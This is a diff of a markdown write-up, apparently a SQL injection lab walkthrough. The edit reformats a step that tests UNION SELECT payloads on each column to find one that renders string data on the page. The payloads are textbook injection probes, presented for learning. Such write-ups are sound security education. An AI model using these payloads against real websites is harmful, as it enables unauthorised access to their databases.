@@ -83,8 +83,10 @@ The error on the 4thh Column confirms that the query contains exactly **3 Column
 ### 2. Indentify the Suitable column for Data Extraction
 After confirming a 3-columm structure, I used a UNION SELECT attack to identify which column could render string data onto the webpage. I tested each column sequentially by replacing NULL with the string 'Test':
 - **Payload 1:**
-```' UNION SELECT 'Test', NULL, NULL--```
-Result: Error (Likely due to a data type mismatch, e.g., the column expects an Integer).
+```
+' UNION SELECT 'Test', NULL, NULL--
+```
+**Result:** Error (Likely due to a data type mismatch, e.g., the column expects an Integer).
 - **Test 2:** ' UNION SELECT NULL,'Test', NULL--
 Result: Success. The word Test appeared on the webpage
 - **Test 3:** ' UNION SELECT NULL, NULL, 'Test'--
